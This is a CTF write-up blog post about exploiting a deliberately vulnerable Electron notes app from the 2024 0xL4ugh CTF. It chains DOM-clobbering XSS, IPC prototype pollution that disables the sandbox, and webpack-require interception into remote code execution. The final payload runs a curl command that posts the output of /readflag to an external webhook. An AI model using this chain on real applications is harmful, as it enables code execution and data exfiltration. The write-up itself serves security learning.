<!doctype html><html lang=en-us dir=ltr><head><meta charset=utf-8><meta name=viewport content="width=device-width"><title>2024 0xL4ugh CTF - Ada Indonesia Coy ðŸ‡®ðŸ‡© | circleous</title><link rel=stylesheet href=/css/main.min.a16339a5d57f8df4724d41efd02e48d0023feb1e3934721f39cbdc1bb1a12b31.css integrity="sha256-oWM5pdV/jfRyTUHv0C5I0AI/6x45NHIfOcvcG7GhKzE=" crossorigin=anonymous><link rel=stylesheet href=/css/codes.min.212a1080bdb9f68724a4aff8ef71b5bf08e662a8f5ef70b13d4d94330d804899.css integrity="sha256-ISoQgL259ockpK/473G1vwjmYqj173CxPU2UMw2ASJk=" crossorigin=anonymous></head><body><header><h1><a href=/>circleous</a></h1><nav><ul><li><a href=/>Home</a></li><li><a aria-current=true class=ancestor href=/posts/>Posts</a></li><li><a href=/tags/>Tags</a></li></ul></nav></header><main><article><header><h1>2024 0xL4ugh CTF - Ada Indonesia Coy ðŸ‡®ðŸ‡©</h1><time datetime=2024-12-29T00:00:00+07:00>December 29, 2024</time></header><h2 id=the-problem>The Problem</h2><p>There are tons of files for this challenge, but our main focus would be these 2 files which defines the electron app.</p><p><a href=https://gist.github.com/nolangilardi/fc8b30441d669a985b471364bb3d07e6>https://gist.github.com/nolangilardi/fc8b30441d669a985b471364bb3d07e6</a></p><p>Our <code>BroweserWindow</code> loaded with this config as nodeIntegration and contextIsolation set to false. This means that the renderer doesnt get access to node feature except for the preload script (nodeIntegration:false), but both the preload and electron internal shares the same Javascript context (contextIsolation:false).</p><p>The <code>BrowserWindow</code> is loaded with the following configuration:</p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span>    webPreferences<span style=color:#9ece6a;font-weight:700>:</span> {
</span></span><span style=display:flex><span>      preload<span style=color:#9ece6a;font-weight:700>:</span> path.join(__dirname, <span style=color:#9ece6a>&#34;./preload.js&#34;</span>),
</span></span><span style=display:flex><span>      nodeIntegration<span style=color:#9ece6a;font-weight:700>:</span> <span style=color:#e0af68>false</span>,
</span></span><span style=display:flex><span>      contextIsolation<span style=color:#9ece6a;font-weight:700>:</span> <span style=color:#e0af68>false</span>,
</span></span><span style=display:flex><span>    },
</span></span></code></pre></div><p>With <code>nodeIntegration: false</code>, the renderer process doesn&rsquo;t have direct access to Node.js features. Meanwhile, <code>contextIsolation: false</code> means the preload script and Electron internals share the same JavaScript context.</p><h2 id=vulns>Vulns</h2><h3 id=xss-in-renderer>XSS in renderer</h3><p>The following function is designed to create an iframe for displaying notes:</p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#bb9af7>async</span> <span style=color:#9d7cd8>function</span> createNoteFrame(html, time) {
</span></span><span style=display:flex><span>    <span style=color:#bb9af7>const</span> note <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#9ece6a>document</span>.createElement(<span style=color:#9ece6a>&#34;iframe&#34;</span>)
</span></span><span style=display:flex><span>    note.frameBorder <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#e0af68>false</span>
</span></span><span style=display:flex><span>    note.height <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#9ece6a>&#34;250px&#34;</span>
</span></span><span style=display:flex><span>    note.srcdoc <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#9ece6a>&#34;&lt;dialog id=&#39;dialog&#39;&gt;&#34;</span> <span style=color:#9ece6a;font-weight:700>+</span> html <span style=color:#9ece6a;font-weight:700>+</span> <span style=color:#9ece6a>&#34;&lt;/dialog&gt;&#34;</span>
</span></span><span style=display:flex><span>    note.sandbox <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#9ece6a>&#39;allow-same-origin&#39;</span>
</span></span><span style=display:flex><span>    note.onload <span style=color:#9ece6a;font-weight:700>=</span> (ev) =&gt; {
</span></span><span style=display:flex><span>        <span style=color:#bb9af7>const</span> dialog <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#bb9af7>new</span> <span style=color:#9ece6a>Proxy</span>(ev.target.contentWindow.dialog, {
</span></span><span style=display:flex><span>            get<span style=color:#9ece6a;font-weight:700>:</span> (target, prop) =&gt; {
</span></span><span style=display:flex><span>                <span style=color:#bb9af7>const</span> res <span style=color:#9ece6a;font-weight:700>=</span> target[prop];
</span></span><span style=display:flex><span>                <span style=color:#bb9af7>return</span> <span style=color:#bb9af7>typeof</span> res <span style=color:#9ece6a;font-weight:700>===</span> <span style=color:#9ece6a>&#34;function&#34;</span> <span style=color:#9ece6a;font-weight:700>?</span> res.bind(target) <span style=color:#9ece6a;font-weight:700>:</span> res;
</span></span><span style=display:flex><span>            },
</span></span><span style=display:flex><span>        })
</span></span><span style=display:flex><span>        setInterval(dialog.close, time <span style=color:#9ece6a;font-weight:700>/</span> <span style=color:#e0af68>2</span>);
</span></span><span style=display:flex><span>        setInterval(dialog.showModal, time);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#bb9af7>return</span> note
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#bb9af7>const</span> mynote <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#bb9af7>await</span> createNoteFrame(<span style=color:#9ece6a>&#34;&lt;h1&gt;Hati Hati!&lt;/h1&gt;&lt;p&gt;Website &#34;</span> <span style=color:#9ece6a;font-weight:700>+</span> <span style=color:#9ece6a>decodeURIComponent</span>(<span style=color:#9ece6a>document</span>.location) <span style=color:#9ece6a;font-weight:700>+</span> <span style=color:#9ece6a>&#34; Kemungkinan Berbahaya!&lt;/p&gt;&#34;</span>, <span style=color:#e0af68>1000</span>)
</span></span></code></pre></div><p>We can leverage DOM clobbering of <code>dialog.close</code> or <code>dialog.showModal</code> to execute arbitrary JavaScript code. This is one of the quirks of <code>setTimeout</code> and <code>setInterval</code>, where if we suply the first argument as string, it will try to create new Js Function and execute it. The payload would be like this</p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>&lt;<span style=color:#bb9af7>a</span> <span style=color:#7aa2f7>id</span><span style=color:#9ece6a;font-weight:700>=</span><span style=color:#9ece6a>dialog</span> <span style=color:#7aa2f7>name</span><span style=color:#9ece6a;font-weight:700>=</span><span style=color:#9ece6a>close</span> <span style=color:#7aa2f7>href</span><span style=color:#9ece6a;font-weight:700>=</span><span style=color:#9ece6a>&#34;foo:console.log(1337)&#34;</span>&gt;
</span></span></code></pre></div><h3 id=prototype-pollution-in-config-via-ipc-communication>Prototype Pollution in config via IPC communication</h3><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#414868;font-style:italic>// main.js
</span></span></span><span style=display:flex><span>ipcMain.handle(<span style=color:#9ece6a>&#34;set-config&#34;</span>, (_, conf, obj) =&gt; {
</span></span><span style=display:flex><span>  <span style=color:#9ece6a>Object</span>.assign(config[conf], obj)
</span></span><span style=display:flex><span>})
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>ipcMain.handle(<span style=color:#9ece6a>&#34;get-config&#34;</span>, (_) =&gt; {
</span></span><span style=display:flex><span>  <span style=color:#bb9af7>return</span> config
</span></span><span style=display:flex><span>})
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>ipcMain.handle(<span style=color:#9ece6a>&#34;get-window&#34;</span>, (_) =&gt; {
</span></span><span style=display:flex><span>  <span style=color:#bb9af7>const</span> win <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#bb9af7>new</span> BrowserWindow({
</span></span><span style=display:flex><span>    width<span style=color:#9ece6a;font-weight:700>:</span> <span style=color:#e0af68>800</span>,
</span></span><span style=display:flex><span>    height<span style=color:#9ece6a;font-weight:700>:</span> <span style=color:#e0af68>600</span>,
</span></span><span style=display:flex><span>    parent<span style=color:#9ece6a;font-weight:700>:</span> mainWindow,
</span></span><span style=display:flex><span>    webPreferences<span style=color:#9ece6a;font-weight:700>:</span> {
</span></span><span style=display:flex><span>      preload<span style=color:#9ece6a;font-weight:700>:</span> path.join(__dirname, <span style=color:#9ece6a>&#39;preload.js&#39;</span>),
</span></span><span style=display:flex><span>      nodeIntegration<span style=color:#9ece6a;font-weight:700>:</span> <span style=color:#e0af68>false</span>,
</span></span><span style=display:flex><span>      contextIsolation<span style=color:#9ece6a;font-weight:700>:</span> <span style=color:#e0af68>false</span>,
</span></span><span style=display:flex><span>    },
</span></span><span style=display:flex><span>    fullscreen<span style=color:#9ece6a;font-weight:700>:</span> <span style=color:#e0af68>false</span>,
</span></span><span style=display:flex><span>  })
</span></span><span style=display:flex><span>  win.loadFile(<span style=color:#9ece6a>&#34;./ada-indonesia-coy/index.html&#34;</span>)
</span></span><span style=display:flex><span>})
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic>// preload.js
</span></span></span><span style=display:flex><span><span style=color:#bb9af7>class</span> api {
</span></span><span style=display:flex><span>    getConfig(){
</span></span><span style=display:flex><span>        <span style=color:#bb9af7>return</span> electron.ipcRenderer.invoke(<span style=color:#9ece6a>&#34;get-config&#34;</span>)
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    setConfig(conf, obj){
</span></span><span style=display:flex><span>        <span style=color:#bb9af7>return</span> electron.ipcRenderer.invoke(<span style=color:#9ece6a>&#34;set-config&#34;</span>, conf, obj)
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#9ece6a>window</span>(){
</span></span><span style=display:flex><span>        <span style=color:#bb9af7>return</span> electron.ipcRenderer.invoke(<span style=color:#9ece6a>&#34;get-window&#34;</span>)
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#9ece6a>window</span>.api <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#bb9af7>new</span> api()
</span></span></code></pre></div><p><code>preload.js</code> exposes the 3 custom ipcs to renderer. <code>set-config</code> ipc handler directly modifies config object using <code>Object.assign</code>. By setting <code>config.__proto__</code> to arbitrary value, this means we have prototype pollution.</p><p>This prototype pollution can be used to toggle on/off some default configuration where spawnin new <code>BrowserWindow</code> using the overriden value with prototype pollution, for example ticking off sandbox so that newly spawned BrowserWindow would have <code>--no-sandbox</code>.</p><p>We can confirm this by running the below JS directly into dev console (open it with Ctrl+Shift+I) and then check the running process using <code>ps</code>.</p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span>api.setConfig(<span style=color:#9ece6a>&#34;__proto__&#34;</span>, {sandbox<span style=color:#9ece6a;font-weight:700>:</span><span style=color:#e0af68>0</span>})
</span></span><span style=display:flex><span>api.<span style=color:#9ece6a>window</span>()
</span></span></code></pre></div><pre tabindex=0><code>user       23110   23024  1 05:33 pts/4    00:00:00 /redacted/baby-electron
                     --type=renderer
                     --enable-crash-reporter=1055940f-328a-45d8-8bec-258737cfdddc,no_channel
                     --user-data-dir=/home/user/.config/baby-electron
                     --app-path=/redacted/resources/app.asar
                     --enable-sandbox
                     --disable-gpu-compositing
                     --lang=en-US
                     --num-raster-threads=3
                     --enable-main-frame-before-activation
                     --renderer-client-id=5
                     --time-ticks-at-unix-epoch=-1735446046824602
                     --launch-time-ticks=4336005364
                     --shared-files=v8_context_snapshot_data:100
                     --field-trial-handle=0,i,3045807141174497258,9035281799453053754,262144
                     --disable-features=SpareRendererForSitePerProcess
...
user       23245   23017  2 05:33 pts/4    00:00:00 /redacted/baby-electron
                     --type=renderer
                     --enable-crash-reporter=1055940f-328a-45d8-8bec-258737cfdddc,no_channel
                     --user-data-dir=/home/user/.config/baby-electron
                     --app-path=/redacted/resources/app.asar
                     --no-sandbox
                     --no-zygote
                     --disable-gpu-compositing
                     --lang=en-US
                     --num-raster-threads=3
                     --enable-main-frame-before-activation
                     --renderer-client-id=10
                     --time-ticks-at-unix-epoch=-1735446046824602
                     --launch-time-ticks=4359800634
                     --shared-files=v8_context_snapshot_data:100
                     --field-trial-handle=0,i,3045807141174497258,9035281799453053754,262144
                     --disable-features=SpareRendererForSitePerProcess
</code></pre><p>notice that there are 2 electron process, one with <code>--enable-sandbox</code> and the other one with <code>--no-sandbox</code>.</p><h3 id=exposing-node-modules-to-renderer-process>Exposing node modules to renderer process</h3><p>Since BrowserWindow started with contextIsolation set to false, we can expose it using polluting builtins objects (Js context shared with electron internals). This is explained better in the other author challenge writeup <a href=https://github.com/maple3142/My-CTF-Challenges/tree/master/HITCON%20CTF%202023/Harmony>2023 HITCON CTF - Harmony</a>.</p><p>This works because electron internally uses webpack and webpack require will do a lazy load. When electron internally does <code>__webpack_require__("./lib/renderer/api/ipc-renderer.ts")</code>, we will intercept it and copy <code>this</code> object from <code>t</code> and exposes it to our window renderer. This code explains better than words,</p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#9ece6a>window</span>.copyOfIpcRenderer <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#e0af68>null</span>;
</span></span><span style=display:flex><span><span style=color:#9ece6a>Object</span>.defineProperty(<span style=color:#9ece6a>Object</span>.prototype, <span style=color:#9ece6a>`./lib/renderer/api/ipc-renderer.ts`</span>, {
</span></span><span style=display:flex><span>  set(v) {
</span></span><span style=display:flex><span>    <span style=color:#9ece6a>window</span>.copyOfIpcRenderer <span style=color:#9ece6a;font-weight:700>=</span> v;
</span></span><span style=display:flex><span>    <span style=color:#9ece6a>window</span>.module <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#bb9af7>this</span>.module;
</span></span><span style=display:flex><span>  },
</span></span><span style=display:flex><span>  get() {
</span></span><span style=display:flex><span>    <span style=color:#bb9af7>return</span> <span style=color:#9ece6a>window</span>.copyOfIpcRenderer;
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>});
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#9d7cd8>function</span> __webpack_require__(r) {
</span></span><span style=display:flex><span>	<span style=color:#9d7cd8>var</span> n <span style=color:#9ece6a;font-weight:700>=</span> t[r];
</span></span><span style=display:flex><span>	<span style=color:#bb9af7>if</span> (<span style=color:#bb9af7>void</span> <span style=color:#e0af68>0</span> <span style=color:#9ece6a;font-weight:700>!==</span> n)
</span></span><span style=display:flex><span>		<span style=color:#bb9af7>return</span> n.exports;
</span></span><span style=display:flex><span>	<span style=color:#9d7cd8>var</span> i <span style=color:#9ece6a;font-weight:700>=</span> t[r] <span style=color:#9ece6a;font-weight:700>=</span> {
</span></span><span style=display:flex><span>		exports<span style=color:#9ece6a;font-weight:700>:</span> {}
</span></span><span style=display:flex><span>	};
</span></span><span style=display:flex><span>	<span style=color:#bb9af7>return</span> e[r](i, i.exports, __webpack_require__),
</span></span><span style=display:flex><span>	i.exports
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><h2 id=chaining-it-together>Chaining it together</h2><p>Since the javascript code will be executed on <code>setInterval</code>, we can clean this up to execute only one within sync guard if block</p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#bb9af7>if</span> (<span style=color:#9ece6a;font-weight:700>!</span><span style=color:#9ece6a>window</span>.SyncOnce) {
</span></span><span style=display:flex><span>  <span style=color:#9ece6a>window</span>.SyncOnce <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#e0af68>true</span>;
</span></span><span style=display:flex><span>  ...
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>First, we will need to intercept the <code>__webpack_require__</code> function, due to electron lazyLoading ipcRenderer and we will need to intercept it before we do any ipc communication.</p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#bb9af7>if</span> (<span style=color:#9ece6a;font-weight:700>!</span><span style=color:#9ece6a>window</span>.SyncOnce) {
</span></span><span style=display:flex><span>  <span style=color:#9ece6a>window</span>.SyncOnce <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#e0af68>true</span>;
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span>  <span style=color:#9ece6a>window</span>.copyOfIpcRenderer <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#e0af68>null</span>;
</span></span><span style=display:flex><span>  <span style=color:#9ece6a>Object</span>.defineProperty(<span style=color:#9ece6a>Object</span>.prototype, <span style=color:#9ece6a>`./lib/renderer/api/ipc-renderer.ts`</span>, {
</span></span><span style=display:flex><span>    set(v) {
</span></span><span style=display:flex><span>      <span style=color:#9ece6a>window</span>.copyOfIpcRenderer <span style=color:#9ece6a;font-weight:700>=</span> v;
</span></span><span style=display:flex><span>      <span style=color:#9ece6a>window</span>.module <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#bb9af7>this</span>.module;
</span></span><span style=display:flex><span>    },
</span></span><span style=display:flex><span>    get() {
</span></span><span style=display:flex><span>      <span style=color:#bb9af7>return</span> <span style=color:#9ece6a>window</span>.copyOfIpcRenderer;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>  });
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>Secondly, we can start do some ipc communications. Using prototype pollution to disable sandbox and spawn new BrowserWindow,</p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#bb9af7>if</span> (<span style=color:#9ece6a;font-weight:700>!</span><span style=color:#9ece6a>window</span>.SyncOnce) {
</span></span><span style=display:flex><span>  <span style=color:#9ece6a>window</span>.SyncOnce <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#e0af68>true</span>;
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span>  <span style=color:#414868;font-style:italic>// snip
</span></span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  api.setConfig(<span style=color:#9ece6a>`__proto__`</span>, {sandbox<span style=color:#9ece6a;font-weight:700>:</span><span style=color:#e0af68>false</span>});
</span></span><span style=display:flex><span>  api.<span style=color:#9ece6a>window</span>();
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>The new BrowserWindow will have same <code>document.location</code> as our first window, thus makes it executing the same xss payload. At this point we have exposed node modules to our renderer, so we just need to execute RCE payload</p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#bb9af7>if</span> (<span style=color:#9ece6a>window</span>.module <span style=color:#9ece6a;font-weight:700>&amp;&amp;</span> <span style=color:#9ece6a;font-weight:700>!</span><span style=color:#9ece6a>window</span>.syncOnce2) {
</span></span><span style=display:flex><span>  <span style=color:#9ece6a>window</span>.syncOnce2 <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#e0af68>true</span>;
</span></span><span style=display:flex><span>  <span style=color:#9ece6a>window</span>.module.exports._load(<span style=color:#9ece6a>`child_process`</span>).execSync(<span style=color:#9ece6a>`curl http://webhook -d flag=$(/readflag)`</span>);
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><h2 id=final-payload>Final Payload</h2><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#bb9af7>if</span> (<span style=color:#9ece6a;font-weight:700>!</span><span style=color:#9ece6a>window</span>.syncOnce) {
</span></span><span style=display:flex><span>  <span style=color:#9ece6a>window</span>.syncOnce <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#e0af68>true</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#9ece6a>window</span>.copyOfIpcRenderer <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#e0af68>null</span>;
</span></span><span style=display:flex><span>  <span style=color:#9ece6a>Object</span>.defineProperty(<span style=color:#9ece6a>Object</span>.prototype, <span style=color:#9ece6a>`./lib/renderer/api/ipc-renderer.ts`</span>, {
</span></span><span style=display:flex><span>    set(v) {
</span></span><span style=display:flex><span>      <span style=color:#9ece6a>window</span>.copyOfIpcRenderer <span style=color:#9ece6a;font-weight:700>=</span> v;
</span></span><span style=display:flex><span>      <span style=color:#9ece6a>window</span>.module <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#bb9af7>this</span>.module;
</span></span><span style=display:flex><span>    },
</span></span><span style=display:flex><span>    get() {
</span></span><span style=display:flex><span>      <span style=color:#bb9af7>return</span> <span style=color:#9ece6a>window</span>.copyOfIpcRenderer;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>  });
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  api.setConfig(<span style=color:#9ece6a>`__proto__`</span>, { sandbox<span style=color:#9ece6a;font-weight:700>:</span> <span style=color:#e0af68>false</span> });
</span></span><span style=display:flex><span>  api.<span style=color:#9ece6a>window</span>();
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#bb9af7>if</span> (<span style=color:#9ece6a>window</span>.module <span style=color:#9ece6a;font-weight:700>&amp;&amp;</span> <span style=color:#9ece6a;font-weight:700>!</span><span style=color:#9ece6a>window</span>.syncOnce2) {
</span></span><span style=display:flex><span>  <span style=color:#9ece6a>window</span>.syncOnce2 <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#e0af68>true</span>;
</span></span><span style=display:flex><span>  <span style=color:#9ece6a>window</span>.module.exports._load(<span style=color:#9ece6a>`child_process`</span>).execSync(<span style=color:#9ece6a>`curl http://webhook -d flag=$(/readflag)`</span>);
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><h3 id=smuggling-the-payload>Smuggling the Payload</h3><p>Encode the payload in dom clobbering attack</p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>&lt;<span style=color:#bb9af7>a</span> <span style=color:#7aa2f7>id</span><span style=color:#9ece6a;font-weight:700>=</span><span style=color:#9ece6a>dialog</span> <span style=color:#7aa2f7>name</span><span style=color:#9ece6a;font-weight:700>=</span><span style=color:#9ece6a>close</span> <span style=color:#7aa2f7>href</span><span style=color:#9ece6a;font-weight:700>=</span><span style=color:#9ece6a>&#34;foo:PAYLOAD&#34;</span>&gt;
</span></span></code></pre></div><p>Use a meta-equiv tag to redirect and inject URL encoded DOM clobbering payload via the URL hash:</p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>&lt;<span style=color:#bb9af7>meta</span> <span style=color:#7aa2f7>http-equiv</span><span style=color:#9ece6a;font-weight:700>=</span><span style=color:#9ece6a>&#34;refresh&#34;</span> <span style=color:#7aa2f7>content</span><span style=color:#9ece6a;font-weight:700>=</span><span style=color:#9ece6a>&#34;0; url=https://127.0.0.1:3000/#...&#34;</span>&gt;
</span></span></code></pre></div><div><div>Tags:</div><ul><li><a href=/tags/ctf-writeup/>Ctf-Writeup</a></li><li><a href=/tags/electron/>Electron</a></li><li><a href=/tags/web/>Web</a></li></ul></div></article></main><footer><p>&copy; 2025 circleous. Licensed under <a href=https://creativecommons.org/publicdomain/zero/1.0/ target=_blank>CC0</a>.</p></footer></body></html>